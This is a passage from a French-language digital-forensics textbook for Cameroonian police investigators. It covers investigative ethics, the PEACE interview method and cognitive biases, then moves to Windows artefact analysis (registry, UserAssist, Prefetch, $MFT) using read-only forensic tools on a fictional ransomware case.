Le \termecle{biais de confirmation}\index{biais de confirmation}
--- la tendance à privilégier les informations qui confirment nos
croyances initiales --- est l'ennemi structurel de l'objectivité
investigative. Sa particularité~: il opère de façon \emph{inconsciente}.

\begin{boiteRemarque}{Le biais de confirmation en chiffres}
Une hypothèse préalable (``c'est lui le coupable'') modifie
l'interprétation de tout ce qui suit~:
\begin{itemize}
    \item Un interviewé nerveux~$\to$ s'il est étiqueté ``menteur''~:
          confirmation du mensonge. S'il est étiqueté ``victime''~:
          compréhension du traumatisme.
    \item Une incohérence dans le récit~$\to$ si hypothèse coupable~:
          preuve de mensonge. Si hypothèse innocent~: erreur de mémoire.
    \item Chaque comportement réinterprété à travers le filtre de
          l'étiquette initiale~--- biais de confirmation en cascade.
\end{itemize}
\textbf{Contre-mesure~:} E9bis du PIU (falsification active). Pour
chaque hypothèse~: chercher activement ce qui la réfuterait, pas
ce qui la confirme.
\end{boiteRemarque}

\subsection{Tension~4~: Loyauté institutionnelle vs Intégrité personnelle}

Quand un supérieur hiérarchique demande de ``conclure vite''~; quand
un collègue a contaminé une scène~; quand des preuves pointent vers
des personnes influentes~:

\begin{itemize}
    \item \textbf{Signalement interne}~: documenter précisément les
          faits~; remonter par la chaîne hiérarchique~; conserver une
          copie personnelle de toute documentation transmise.
    \item \textbf{Signalement externe}~: si le signalement interne
          échoue ou est bloqué~: ANTIC~; parquet~; inspection générale
          des services.
    \item \textbf{Protection~:} un OPJ qui signale de bonne foi une
          irrégularité bénéficie en principe d'une protection contre
          les représailles~--- même si la protection légale explicite
          est encore faible en droit camerounais.
\end{itemize}

\begin{boxalert}
\textbf{Le courage déontologique~: la compétence la moins enseignée}

Il est plus difficile de refuser d'exécuter un ordre illégal d'un
supérieur que de résister à un suspect hostile. Les études sur les
erreurs judiciaires montrent que la plupart impliquent au moins un
acteur qui ``savait'' mais s'est tu. Le courage déontologique est
la vertu qui protège la chaîne judiciaire de la corruption systémique.
\end{boxalert}

\subsection{Tension~5~: Compétence personnelle vs Délégation nécessaire}

L'investigateur doit savoir reconnaître les limites de ses propres
compétences. Intervenir au-delà de sa formation~:
\begin{itemize}
    \item Contamine les preuves (violation d'ACPO Principe~2)~;
    \item Engage sa responsabilité personnelle~;
    \item Fragilise l'ensemble du dossier.
\end{itemize}

\textbf{Règle pratique~:} « Si je ne sais pas faire sans risque de
modifier les données, je ne fais pas. J'appelle un spécialiste et
je documente pourquoi. » Cette auto-évaluation honnête est elle-même
une compétence déontologique.

% ============================================================================
\section{Droits des Personnes Interrogées}
\label{sec:droits-personnes}
% ============================================================================

\subsection{Cadre légal et principe}

Tout entretien investigatif implique des personnes~: victimes, témoins,
suspects. Chaque catégorie dispose de droits spécifiques qui conditionnent
la valeur probatoire des témoignages recueillis.

\begin{boxjuris}
\textbf{Droits fondamentaux en contexte d'entretien investigatif~:}
\begin{itemize}
    \item \textbf{Droit à l'information}~: toute personne entendue
          doit être informée de l'objet de l'entretien et de son
          droit de refuser (sauf obligation légale contraire).
    \item \textbf{Droit à l'assistance}~: un suspect en garde à vue
          a le droit à l'assistance d'un avocat dès le début
          (CPP camerounais).
    \item \textbf{Droit au silence}~: le suspect ne peut être contraint
          à s'auto-incriminer (principe \textit{nemo tenetur}).
    \item \textbf{Droits des mineurs}~: présence obligatoire d'un
          représentant légal~; protocoles spécifiques~; attention
          particulière aux processus de mémoire (contamination facile).
    \item \textbf{Droit à l'interprète}~: si la personne ne maîtrise
          pas la langue de l'entretien~; l'interprète doit être
          assermenté pour les actes judiciaires.
\end{itemize}
\end{boxjuris}

\subsection{La méthode PEACE~: entretien éthique et efficace}

La méthode \termecle{PEACE}\index{méthode PEACE}
(\textit{Preparation, Engage, Account, Closure, Evaluation}), développée
par la police britannique en 1992, est la référence mondiale pour les
entretiens investigatifs respectueux des droits~:

\begin{tableaucours}{p{2.8cm}p{8.8cm}}{%
    \tableauHeader{Phase} &
    \tableauHeader{Contenu et objectifs}
}
\textbf{P --- Préparation} &
    Définir l'objectif de l'entretien. Recueillir toutes les informations
    disponibles. Choisir le lieu et le moment adaptés. Préparer les
    questions ouvertes. \\
\textbf{E --- Engage and Explain} &
    Établir le rapport~; présenter l'objet~; informer des droits~;
    mettre à l'aise. Un témoin à l'aise révèle davantage. \\
\textbf{A --- Account} &
    Recueillir le récit libre sans interruption~; puis poser des
    questions de clarification. Ne jamais diriger~; ne pas suggérer. \\
\textbf{C --- Closure} &
    Résumer~; donner à l'interviewé l'opportunité de corriger,
    compléter ou ajouter. Informer des suites. \\
\textbf{E --- Evaluation} &
    Documenter immédiatement~; évaluer la cohérence~; identifier
    les lacunes~; planifier les entretiens suivants. \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~13.2 --- Méthode PEACE~: entretien éthique et efficace}\end{center}

\begin{boiteRemarque}{Pourquoi PEACE est plus efficace que l'interrogatoire coercitif}
Les études de psychologie légale montrent que les techniques d'entretien
basées sur l'instauration d'une confiance et la narration libre obtiennent
\emph{plus} d'informations utiles que les techniques coercitives, tout en
produisant \emph{moins} de faux aveux. L'entretien éthique n'est pas un
sacrifice d'efficacité~--- c'est une méthode supérieure.
\end{boiteRemarque}

% ============================================================================
\section{Biais Cognitifs et Contre-Mesures}
\label{sec:biais}
% ============================================================================

\subsection{Les six biais les plus dangereux en investigation}

\begin{tableaucours}{p{3.5cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Biais} &
    \tableauHeader{Manifestation investigative} &
    \tableauHeader{Contre-mesure}
}
\textbf{Confirmation} &
    Chercher des preuves qui confirment l'hypothèse initiale~;
    ignorer les preuves contraires &
    E9bis PIU~: chercher activement ce qui réfuterait l'hypothèse \\
\textbf{Ancrage} &
    Première information reçue oriente toutes les suivantes~;
    première suspicion difficile à réviser &
    Générer plusieurs hypothèses (E8 PIU) avant de fixer une conclusion \\
\textbf{Étiquetage prématuré} &
    Qualifier ``suspect'' ou ``menteur'' oriente l'interprétation
    de tous les comportements ultérieurs (Becker, 1963) &
    Maintenir des catégories ouvertes~; consigner les observations
    avant les interprétations \\
\textbf{Disponibilité} &
    Surestimer la probabilité d'un scénario parce qu'il est familier~;
    ``ce ressemble à ce que j'ai vu l'an dernier'' &
    Vérifier la ressemblance par les faits, pas par l'intuition~;
    raisonner sur les statistiques \\
\textbf{Surconfiance} &
    Croire être objectif quand on ne l'est pas~; ``je sais
    quand quelqu'un ment'' &
    Taux de précision humain dans détection du mensonge~:
    54\%~--- à peine mieux que le hasard \\
\textbf{Tunnelisation} &
    Se focaliser sur un seul suspect/scénario~; négliger
    les alternatives &
    ``Quelle est l'hypothèse que je n'ai pas explorée~?''
    Rotation de l'hypothèse active tous les 48h \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~13.3 --- Biais cognitifs et contre-mesures}\end{center}

\subsection{La pratique de l'objectivité~: protocoles concrets}

\begin{enumerate}
    \item \textbf{Séparer constatations et interprétations~:}
          dans chaque document~: une section ``Constatations''
          (faits vérifiables) et une section ``Analyse''
          (interprétations, avec niveau de certitude explicite).
          Jamais mêlés.
    \item \textbf{Documenter les preuves contraires~:} noter explicitement
          chaque preuve qui ne s'accorde pas avec l'hypothèse principale.
          Si le dossier n'en contient aucune, chercher plus.
    \item \textbf{Rotation des hypothèses~:} tous les deux jours, s'obliger
          à défendre l'hypothèse inverse. Que faudrait-il pour qu'elle
          soit vraie~?
    \item \textbf{Revue par les pairs~:} présenter les conclusions
          préliminaires à un collègue avec le mandat explicite de
          les contester.
    \item \textbf{Journal de bord éthique~:} noter les situations
          où la pression a été ressentie pour orienter les conclusions~;
          les moments de doute~; les décisions difficiles. Ce journal
          constitue une protection en cas de contestation ultérieure.
\end{enumerate}

% ============================================================================
\section{Responsabilité Personnelle de l'Investigateur}
\label{sec:responsabilite}
% ============================================================================

\subsection{Responsabilité pénale personnelle}

L'investigateur numérique n'est pas protégé par ``j'exécutais un ordre''.
En droit camerounais~:

\begin{itemize}
    \item \textbf{Responsabilité pour violation de procédure~:}
          un OPJ qui conduit une perquisition sans autorisation judiciaire
          (art.~52 Loi~2010) commet une faute personnelle~; il peut être
          poursuivi pour violation de domicile, atteinte à la vie privée.
    \item \textbf{Responsabilité pour faux~:} un investigateur qui
          falsifie un rapport d'expertise ou un formulaire de custody
          commet le crime de faux en écriture (art.~155--162 Code pénal)~;
          c'est une infraction personnelle, indépendante du résultat
          de l'affaire.
    \item \textbf{Responsabilité pour complicité~:} un investigateur
          qui couvre la violation procédurale d'un collègue peut être
          poursuivi pour complicité ou recel (art.~89 Code pénal).
\end{itemize}

\subsection{ACPO Principe~4~: responsabilité du chef d'investigation}

Le Principe~4 du guide ACPO établit que \textbf{le responsable de
l'investigation est personnellement responsable de la conformité de
l'ensemble de l'équipe}. Cette responsabilité~:
\begin{itemize}
    \item S'étend à toutes les actions de chaque membre de l'équipe~;
    \item Implique une supervision active~: pas de délégation aveugle~;
    \item Exige une documentation systématique des décisions~: chaque
          choix procédural doit pouvoir être justifié.
\end{itemize}

\subsection{L'obligation d'auto-évaluation continue}

Le formulaire d'auto-évaluation de compétences non techniques (grille
CNT~1--15) est un outil de développement professionnel~: identifier
ses lacunes avant qu'elles ne causent une erreur judiciaire. Les cinq
questions clés à se poser à la clôture de chaque investigation~:

\begin{enumerate}
    \item Ai-je cherché activement des preuves contraires à mon hypothèse~?
    \item Ai-je respecté scrupuleusement les droits de chaque personne
          rencontrée~?
    \item Ai-je documenté tous les transferts d'evidence, même temporaires~?
    \item Y a-t-il un moment où j'ai ressenti de la pression pour
          orienter mes conclusions~? L'ai-je documenté~?
    \item Mon rapport est-il défendable mot à mot en contre-interrogatoire~?
\end{enumerate}

% ============================================================================
\section{Déontologie et Témoignage Expert}
\label{sec:temoignage-expert}
% ============================================================================

L'investigateur peut être amené à témoigner en tant qu'expert devant
un tribunal. Cette situation exige une préparation spécifique.

\subsection{Obligations de l'expert judiciaire}

\begin{itemize}
    \item \textbf{Impartialité}~: l'expert n'est ni l'avocat de
          l'accusation ni celui de la défense. Il est le serviteur
          de la vérité~--- même si ses conclusions déplaisent à
          l'autorité qui l'a mandaté.
    \item \textbf{Compétence déclarée}~: l'expert ne doit témoigner
          que dans le domaine de sa compétence réelle. Affirmer une
          certitude que la technique ne permet pas est une faute grave.
    \item \textbf{Limites explicites}~: déclarer ce que l'analyse
          \emph{ne peut pas} établir est aussi important que déclarer
          ce qu'elle établit.
    \item \textbf{Distinction constatation/interprétation}~: devant
          le tribunal~: « J'ai constaté X. Une interprétation de X
          serait Y, mais d'autres explications sont possibles. »
\end{itemize}

\subsection{Résistance au contre-interrogatoire}

\begin{boiteRemarque}{Comment se préparer au contre-interrogatoire}
\begin{enumerate}
    \item Relire l'intégralité du rapport d'expertise la veille~;
    \item Identifier soi-même les trois points les plus attaquables~;
    \item Préparer une réponse factuelle et documentée pour chacun~;
    \item Pendant l'interrogatoire~: répondre aux questions posées,
          pas aux questions redoutées~; ne pas sur-interpréter~;
          dire ``je ne sais pas'' quand c'est vrai.
    \item Ne jamais modifier verbalement une conclusion écrite
          sous la pression d'un avocat compétent~: ``Mon rapport
          parle pour lui-même.''
\end{enumerate}
\end{boiteRemarque}

% ============================================================================
\section{Cas Pratique~: L'Affaire ONAMBELE --- Décisions Déontologiques}
\label{sec:deon-onambele}
% ============================================================================

\begin{boxscenario}{Affaire ONAMBELE --- trois décisions sous pression}
\textbf{Contexte~:} L'OPJ NKENG, en charge de l'affaire ONAMBELE (fraude
sur les marchés publics, Chapitre~\ref{chap:gr-affaires}), est confronté
à trois situations de pression déontologique au cours de la même semaine.

\textbf{Situation~1 --- Pression hiérarchique~:}
Le directeur de la DCPJ convoque l'OPJ NKENG et lui demande de ``clore
le dossier rapidement''~--- un responsable politique est dans l'entourage
du suspect. NKENG doit décider~: céder à la pression ou maintenir son
investigation.

\textbf{Analyse déontologique~:}
\begin{itemize}
    \item Vertu en jeu~: \textbf{courage}~--- la vertu la moins
          enseignée mais la plus nécessaire.
    \item Action correcte~: documenter précisément la demande (date,
          heure, contenu, nom du demandeur)~; poursuivre l'investigation
          selon les règles~; escalader au parquet si la pression s'intensifie.
    \item Risque~: représailles. Protection~: la documentation.
\end{itemize}

\textbf{Situation~2 --- Preuve contraire à l'hypothèse~:}
L'analyse forensique révèle que les virements suspects ont été initiés
depuis un compte que l'OPJ NKENG avait classé comme ``témoin innocent''~---
pas depuis le compte du suspect principal. L'hypothèse principale s'effondre.

\textbf{Analyse déontologique~:}
\begin{itemize}
    \item Biais en jeu~: \textbf{biais de confirmation}~--- résistance
          à réviser une hypothèse investie de plusieurs semaines de travail.
    \item Action correcte~: consigner immédiatement la découverte dans
          le journal de bord~; rouvrir le champ des hypothèses (E8--E9
          PIU)~; informer le parquet de la révision d'hypothèse.
    \item Vertu en jeu~: \textbf{intégrité}~--- dire la vérité même
          quand elle contrarie son travail antérieur.
\end{itemize}

\textbf{Situation~3 --- Violation par un collègue~:}
L'OPJ NKENG découvre que son collègue BITA a interrogé un suspect sans
présence d'avocat et sans l'informer de ses droits~--- les déclarations
obtenues sont potentiellement irrecevables.

\textbf{Analyse déontologique~:}
\begin{itemize}
    \item Tension~: loyauté envers un collègue vs intégrité du dossier.
    \item Action correcte~: informer le parquet~; documenter la violation~;
          proposer de faire réentendre le suspect dans le respect de
          ses droits.
    \item Conséquence de l'inaction~: si la violation n'est pas signalée
          et est découverte par la défense à l'audience, c'est
          l'ensemble du dossier qui est fragilisé --- et l'OPJ NKENG
          qui a couvert peut être impliqué.
\end{itemize}
\end{boxscenario}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item La déontologie n'est pas une contrainte --- c'est une
          \textbf{condition de l'efficacité}~: un dossier propre est
          un dossier solide.

    \item \textbf{Trois cadres éthiques}~: Kant (droits absolus)~;
          Mill (conséquences)~; Aristote (vertus). Les quatre vertus
          de l'investigateur~: intégrité, courage, prudence, justice.

    \item \textbf{Le biais de confirmation est le plus dangereux}~:
          il opère inconsciemment et réinterprète chaque indice
          pour confirmer l'hypothèse initiale. Contre-mesure~:
          E9bis PIU (falsification active).

    \item \textbf{Méthode PEACE}~: Préparation~$\to$ Engage~$\to$
          Account~$\to$ Closure~$\to$ Evaluation. Plus efficace que
          l'interrogatoire coercitif, et juridiquement recevable.

    \item \textbf{Responsabilité personnelle}~: l'investigateur ne
          peut pas se cacher derrière ``j'exécutais un ordre''.
          Violation de procédure~= faute personnelle~; faux~= crime
          personnel~; complicité de violation~= poursuite personnelle.

    \item \textbf{ACPO Principe~4}~: le responsable de l'investigation
          est personnellement responsable de la conformité de toute
          son équipe. Pas de délégation aveugle.

    \item \textbf{Journal de bord éthique}~: documenter les pressions
          reçues, les moments de doute, les décisions difficiles.
          C'est à la fois un outil de développement professionnel
          et une protection légale.

    \item \textbf{Cinq questions de clôture}~: cherché des preuves
          contraires~? Respecté les droits~? Documenté tous les
          transferts~? Noté les pressions~? Rapport défendable
          mot à mot~?
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~13.1 --- Identification éthique \niveaubase}]
Pour chacune des situations suivantes, identifiez~: (A)~la tension
déontologique en jeu, (B)~le cadre éthique applicable (Kant / Mill /
Aristote), (C)~l'action correcte~:
\begin{enumerate}[(a)]
    \item Un investigateur découvre, au cours d'une analyse forensique
          d'un PC suspect, des photos compromettantes pour un ministre~---
          sans lien avec l'affaire en cours. Son supérieur lui demande
          de ``signaler informellement'' cette découverte à un tiers.
    \item Un OPJ a passé 3~semaines à construire un dossier contre un
          suspect~; une nouvelle preuve suggère une autre personne.
          Un collègue lui dit~: ``tu as déjà trop de travail dans ce
          dossier pour recommencer''.
    \item L'entreprise victime demande à l'investigateur de ne pas
          inclure dans son rapport les failles de sécurité internes
          qui ont facilité l'attaque~--- pour protéger sa réputation.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~13.2 --- Biais cognitifs \niveaumoyen}]
Relisez ce fragment de rapport d'investigation~:

\begin{quote}
\textit{``Lors de l'entretien du 12~mars, BELLO Armand a présenté un
comportement nerveux (regards fuyants, mains tremblantes) confirmant
sa culpabilité dans le détournement. L'analyse des logs révèle 3~connexions
depuis son poste, cohérentes avec notre hypothèse. Le fait que d'autres
employés aient eu accès au même système ne constitue pas un obstacle
significatif à notre conclusion.''}
\end{quote}

\begin{enumerate}[(a)]
    \item Identifiez au moins trois biais cognitifs dans ce passage.
    \item Réécrivez ce passage en séparant strictement constatations
          et interprétations, et en appliquant le principe de falsification.
    \item Quelles questions supplémentaires cet investigateur aurait-il
          dû se poser avant de rédiger ce passage~?
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~13.3 --- Simulation décision éthique \niveauexpert}]
Vous êtes l'expert judiciaire désigné dans l'affaire WOURI
(Chapitre~\ref{chap:gr-affaires}). À l'audience, l'avocat de la défense
vous pose les questions suivantes~:
\begin{enumerate}[(a)]
    \item \textit{``Votre rapport affirme que l'email provenait d'un
          serveur russe. Êtes-vous certain à 100\% de cette conclusion~?''}
    \item \textit{``Vous avez utilisé Volatility~3 pour analyser la RAM.
          N'est-il pas vrai que ce logiciel modifie lui-même la RAM
          pendant la capture~?''}
    \item \textit{``Vous êtes mandaté par le parquet. Vos conclusions
          ne sont-elles pas par nature orientées contre mon client~?''}
\end{enumerate}
Rédigez vos réponses telles que vous les donneriez à l'audience, en
respectant les obligations déontologiques de l'expert judiciaire.
Identifiez pour chaque réponse le principe éthique mobilisé.
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Clôture de la Partie~III.} Ce chapitre clôt la Partie~III
(Cadre normatif et déontologie). Les quatre chapitres de cette partie
ont construit votre culture juridique~: cadre normatif global (Ch.~10),
législation mondiale (Ch.~11), droit camerounais (Ch.~12) et déontologie
(ce chapitre).

La \textbf{Partie~IV} aborde les techniques avancées~: forensique
réseau opérationnelle, anti-forensique et contre-mesures, analyse
formelle et cryptanalyse. Ces chapitres mobilisent l'intégralité
des fondements posés dans les Parties~I à~III~--- techniques,
juridiques et déontologiques.
\end{boxinfo}

      
    % ======================================================================
    % PARTIE IV — FORENSIQUE OPÉRATIONNELLE
    % Standards : SANS FOR508/FOR610, NIST SP 800-86/101, SWGDE
    % Niveau : intermédiaire à expert
    % ======================================================================
    \part{Forensique Opérationnelle}
    \label{part:forensique}

        % ============================================================================
% Fichier  : partie4/P04_C14_forensique_systeme.tex
% Titre    : Forensique Système Avancée
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% Statut   : RÉDIGÉ
% Sources  : Ch. 9 (acquisition -- ce chapitre approfondit l'analyse post-
%            acquisition), affaires MBONGO/MVOM/ONAMBELE, Ch. PIU (E9bis)
% Positionnement : Ch. 9 a couvert ACQUISITION (write blocker, FTK Imager,
%                  formats E01). Ce chapitre couvre l'ANALYSE -- ce que l'on
%                  fait de l'image E01 et du dump RAM une fois acquis :
%                  artefacts Windows (registre, prefetch, $MFT), artefacts
%                  Linux (journaux, ext4), reconstruction de timeline.
%                  Premier chapitre de la Partie IV (techniques avancées).
% ============================================================================

\chapter{Forensique Système Avancée}
\label{chap:for-sys}

\epigraph{%
    « Les systèmes d'exploitation sont les témoins silencieux de nos
    actions numériques. Savoir les interroger, c'est maîtriser l'art
    de faire parler le silence. »%
}{--- Adapté de la pratique forensique}

\niveauChapitre{Expert}{%
    Maîtrise des Chapitres~\ref{chap:PIU} à~\ref{chap:acq} (Partie~II)
    indispensable. Notions de systèmes d'exploitation Windows et Linux
    (systèmes de fichiers, registre, processus) requises.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Analyser les artefacts Windows post-acquisition~: registre,
          Prefetch, ShimCache, Amcache, journal \texttt{\$MFT}.
    \item Reconstruire une timeline d'activité système à partir de
          sources hétérogènes (logs, métadonnées de fichiers, registre).
    \item Analyser les artefacts Linux~: journaux \texttt{systemd},
          historique bash, structures \texttt{ext4} et inodes.
    \item Distinguer ce qui survit à une suppression de fichier de ce
          qui disparaît, et comprendre pourquoi (Locard numérique).
    \item Appliquer la distinction Examination/Analysis (NIST~SP~800-86)
          à l'analyse système.
    \item Construire une timeline forensique avec Autopsy/log2timeline
          et l'interpréter dans le respect du principe de falsification
          (E9bis PIU).
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Ce chapitre dans la séquence du cours}
% ============================================================================

Le Chapitre~\ref{chap:acq} vous a appris à \textbf{acquérir}~: créer
une image E01, capturer la RAM, extraire un téléphone. Ce chapitre vous
apprend à \textbf{analyser} ce que vous avez acquis. La question change~:
non plus ``comment obtenir des données sans les altérer'', mais
``que disent ces données, et comment le prouver''.

\separateur

% ============================================================================
\section{Le Principe de Locard Appliqué au Système}
\label{sec:locard-systeme}
% ============================================================================

Le principe de Locard (Chapitre~\ref{chap:fond-theo})~--- ``tout contact
laisse une trace''~--- se traduit, dans un système d'exploitation, par
une multiplication d'artefacts redondants. Une seule action utilisateur
laisse souvent \textbf{cinq à dix traces indépendantes}, dans des
emplacements différents, avec des granularités temporelles différentes.

\begin{boxdef}
\textbf{Redondance forensique}\index{redondance forensique}~: propriété
selon laquelle une même action système produit plusieurs artefacts
indépendants. La redondance est la meilleure amie de l'investigateur~:
si un artefact est supprimé ou falsifié, les autres subsistent et
révèlent l'incohérence.
\end{boxdef}

\textbf{Exemple~: exécution d'un fichier \texttt{malware.exe} sur Windows}~:

\begin{tableaucours}{p{3.0cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Artefact} &
    \tableauHeader{Information capturée} &
    \tableauHeader{Survit à la suppression du fichier~?}
}
Prefetch (\texttt{.pf}) & Nom, chemin, nombre d'exécutions, dernière
    exécution, fichiers chargés &
    \textbf{Oui} --- fichier séparé dans \texttt{C:\textbackslash Windows\textbackslash Prefetch} \\
ShimCache (AppCompatCache) & Chemin, taille, horodatage de dernière
    modification, présence d'exécution &
    \textbf{Oui} --- clé de registre, persiste après suppression \\
Amcache.hve & Hash SHA-1 du binaire, chemin, premier horodatage
    d'exécution &
    \textbf{Oui} --- ruche de registre séparée \\
\texttt{\$MFT} (NTFS) & Métadonnées du fichier~: création, modification,
    accès, taille &
    \textbf{Partiellement} --- l'entrée MFT peut être réutilisée
    mais le \texttt{\$LogFile} en garde trace \\
Journal des événements
    (Event~ID~4688) & Création de processus, utilisateur, ligne
    de commande &
    \textbf{Oui} --- fichier \texttt{.evtx} séparé \\
USN Journal (\texttt{\$UsnJrnl}) & Historique des modifications du
    volume (création, suppression, renommage) &
    \textbf{Oui} --- journal continu, rotation sur volume \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~14.1 --- Redondance forensique~:
6~artefacts pour une seule exécution}\end{center}

\begin{boxCRO}
\textbf{Analyse CRO --- Redondance et opposabilité}

$\mathcal{R}$ (Fiabilité)~: la convergence de 6~artefacts indépendants
vers la même conclusion (``\texttt{malware.exe} a été exécuté le
13/03/2026 à 02h17'') constitue une preuve bien plus robuste qu'un
seul artefact, même solide.

$\mathcal{O}$ (Opposabilité)~: un avocat peut contester un artefact
isolé (``ce Prefetch pourrait dater d'un test antérieur''). Il ne
peut pas contester la convergence de 6~sources indépendantes sans
expliquer comment elles ont \emph{toutes} été falsifiées de façon
cohérente~--- ce qui est techniquement très difficile.

\cro{$\sim$}{$\uparrow\uparrow$ convergence multi-sources}{$\uparrow\uparrow$ incontestable en pratique}

\textbf{Règle pratique~:} ne jamais conclure sur la base d'un seul
artefact si d'autres sont accessibles. Documenter systématiquement
la convergence (ou la divergence, qui est elle-même une information).
\end{boxCRO}

% ============================================================================
\section{Artefacts Windows~: Registre et Exécution de Programmes}
\label{sec:artefacts-windows}
% ============================================================================

\subsection{Les ruches de registre essentielles}

Le \termecle{registre Windows}\index{registre Windows} est une base de
données hiérarchique stockant la configuration du système et des
applications. Cinq ruches sont systématiquement analysées en forensique~:

\begin{tableaucours}{p{2.5cm}p{3.0cm}p{6.0cm}}{%
    \tableauHeader{Ruche} &
    \tableauHeader{Emplacement disque} &
    \tableauHeader{Contenu forensique}
}
\texttt{SYSTEM} & \texttt{C:\textbackslash Windows\textbackslash System32\textbackslash config} &
    Configuration système, services, périphériques USB connectés
    (\texttt{USBSTOR}), fuseau horaire \\
\texttt{SOFTWARE} & idem &
    Applications installées, versions, ShimCache (AppCompatCache) \\
\texttt{SAM} & idem &
    Comptes utilisateurs locaux, hash NTLM, dernière connexion \\
\texttt{NTUSER.DAT} & \texttt{C:\textbackslash Users\textbackslash <user>} &
    Historique d'exécution (\texttt{RunMRU}), fichiers récents
    (\texttt{RecentDocs}), répertoires tapés (\texttt{TypedPaths}) \\
\texttt{Amcache.hve} & \texttt{C:\textbackslash Windows\textbackslash AppCompat\textbackslash Programs} &
    Inventaire d'applications exécutées avec hash SHA-1 \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~14.2 --- Ruches de registre essentielles}\end{center}

\subsection{Extraction et analyse avec RegRipper}

\begin{boxoutils}{RegRipper --- extraction des ruches de registre}
\begin{lstlisting}[language=bash_forensique]
# Extraire les ruches depuis l'image montee (lecture seule)
# Image montee sous /mnt/evidence/

# Lister les programmes installes
rip.pl -r /mnt/evidence/Windows/System32/config/SOFTWARE
    -p installedsoftware

# Historique des executions via UserAssist (NTUSER.DAT)
rip.pl -r /mnt/evidence/Users/MBONGO/NTUSER.DAT -p userassist
# Resultat type :
# \Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist
#   {chemin}\enc_all.ps1  -- Run Count: 1
#   LastExecuted: 2026-03-13 02:17:42

# Peripheriques USB connectes (historique complet)
rip.pl -r /mnt/evidence/Windows/System32/config/SYSTEM -p usbstor
# Resultat type :
# DeviceClass: Disk
# FriendlyName: Kingston DataTraveler 16GB
# Serial: 0123456789ABCDEF
# FirstConnect: 2026-03-10 09:15:22
# LastConnect: 2026-03-13 02:05:11

# ShimCache (AppCompatCache) -- preuve d'execution
rip.pl -r /mnt/evidence/Windows/System32/config/SYSTEM -p shimcache
# Resultat type :
# Path: C:\Users\admin\AppData\Local\Temp\enc_all.ps1
# Last Modified: 2026-03-13 02:16:58
# Executed: TRUE
\end{lstlisting}
\end{boxoutils}

\begin{boxscenario}{Reconstitution UserAssist --- cas MVOM}
Dans l'Opération MVOM (Chapitre~\ref{chap:gr-affaires}), l'analyse
UserAssist de la ruche \texttt{NTUSER.DAT} de l'administrateur
TRANSBOIS révèle~:

\begin{lstlisting}[language=bash_forensique]
UserAssist Key: {CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}
  powershell.exe          Run Count: 1   Last: 2026-03-13 02:17:40
  cmd.exe                 Run Count: 1   Last: 2026-03-13 02:17:42
  AnyDesk.exe             Run Count: 3   Last: 2026-03-13 02:10:15
\end{lstlisting}

\textbf{Constatation (sans interprétation)~:} L'application
\texttt{AnyDesk.exe} (logiciel de bureau à distance) a été exécutée
3~fois, la dernière à 02h10. \texttt{cmd.exe} a été exécuté à 02h17.
L'ordre chronologique place l'établissement d'un accès distant
\emph{avant} l'exécution des commandes suspectes.\\[0.3ex]
Cette constatation, croisée avec \texttt{windows.netscan} (Volatility,
Ch.~\ref{chap:acq}) qui montre une connexion \texttt{ESTABLISHED} vers
le port~4444 à 02h17, \textbf{converge} vers une chronologie cohérente~:
accès distant établi~$\to$ ouverture d'un shell~$\to$ déploiement
du ransomware.
\end{boxscenario}

\subsection{Le Prefetch~: preuve d'exécution même sans logs}

Le \termecle{Prefetch}\index{Prefetch} est un mécanisme d'optimisation
Windows qui enregistre, pour chaque exécutable lancé, un fichier
\texttt{.pf} dans \texttt{C:\textbackslash Windows\textbackslash Prefetch}.
Ces fichiers survivent souvent à la suppression de l'exécutable lui-même.

\begin{boxoutils}{Analyse Prefetch avec PECmd}
\begin{lstlisting}[language=bash_forensique]
# PECmd (Eric Zimmerman tools) -- analyse complete du repertoire Prefetch
PECmd.exe -d /mnt/evidence/Windows/Prefetch --csv ./output/

# Resultat (extrait CSV) :
# SourceFilename       : ENC_ALL.PS1-3F8A2B91.pf
# ExecutableName       : enc_all.ps1
# RunCount             : 1
# LastRun              : 2026-03-13 02:17:44
# Volume0Created       : 2024-01-15 10:00:00
# FilesAccessed        : C:\Windows\System32\WindowsPowerShell\...
#                        C:\Users\admin\AppData\Local\Temp\enc_all.ps1
#                        C:\Users\Public\Documents\encrypted_files_list.txt
\end{lstlisting}
\textbf{Valeur forensique~:} même si \texttt{enc\_all.ps1} a été supprimé
par l'attaquant après exécution, le fichier Prefetch
\texttt{ENC\_ALL.PS1-3F8A2B91.pf} subsiste et révèle~: le nom exact du
script, son horodatage d'exécution (02h17:44, cohérent avec UserAssist
et Volatility), et la liste des fichiers accédés~--- y compris
\texttt{encrypted\_files\_list.txt}, preuve directe de l'activité ransomware.
\end{boxoutils}

% ============================================================================
\section{Le Système de Fichiers NTFS~: \texttt{\$MFT} et \texttt{\$UsnJrnl}}
\label{sec:ntfs}
% ============================================================================

\subsection{La Master File Table}

La \termecle{\$MFT}\index{\$MFT} (\textit{Master File Table}) est la
structure centrale de NTFS~: chaque fichier et répertoire y possède une
entrée de 1024~octets contenant ses métadonnées. Quatre horodatages
(\textbf{MACE}) sont enregistrés pour chaque fichier~:

\begin{tableaucours}{p{2.0cm}p{3.0cm}p{6.5cm}}{%
    \tableauHeader{Timestamp} &
    \tableauHeader{Signification} &
    \tableauHeader{Piège forensique fréquent}
}
\textbf{M} --- Modified & Dernière modification du contenu &
    Modifié par toute écriture, même mineure~; ne reflète pas
    la création \\
\textbf{A} --- Accessed & Dernier accès en lecture &
